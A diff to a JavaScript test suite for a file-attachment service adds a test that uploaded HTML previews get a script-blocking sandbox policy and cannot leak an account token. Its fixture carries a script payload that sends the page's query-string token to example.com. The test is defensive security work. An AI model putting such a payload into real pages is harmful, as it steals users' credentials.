@@ -423,6 +423,30 @@ test('HTML and SVG require preview mode and remain constrained by a no-script sa
   }
 })
 
+test('query-authenticated HTML previews cannot execute or exfiltrate the account token', async () => {
+  const identity = makeIdentity('active-preview-query-token')
+  const attachment = await upload({
+    identity,
+    name: 'query-token-preview.html',
+    mimeType: 'text/html',
+    body: '<script>fetch(`https://example.com/?token=${location.search}`)</script>',
+  })
+  const preview = await fetch(
+    `${origin}${attachment.downloadUrl}?preview=1&token=${encodeURIComponent(identity.token)}`,
+  )
+
+  assert.equal(preview.status, 200)
+  assert.equal(preview.headers.get('referrer-policy'), 'no-referrer')
+  assert.equal(preview.headers.get('cross-origin-resource-policy'), 'same-origin')
+  const csp = preview.headers.get('content-security-policy') || ''
+  assert.match(csp, /(?:^|;)\s*sandbox(?:;|$)/)
+  assert.match(csp, /default-src 'none'/)
+  assert.match(csp, /script-src 'none'/)
+  assert.match(csp, /form-action 'none'/)
+  assert.doesNotMatch(csp, /allow-scripts/)
+  await preview.arrayBuffer()
+})
+
 test('Office archive validation rejects entry, size, total, and compression-ratio bombs', async () => {
   async function zip(entries, compression = 'STORE') {
     const archive = new JSZip()
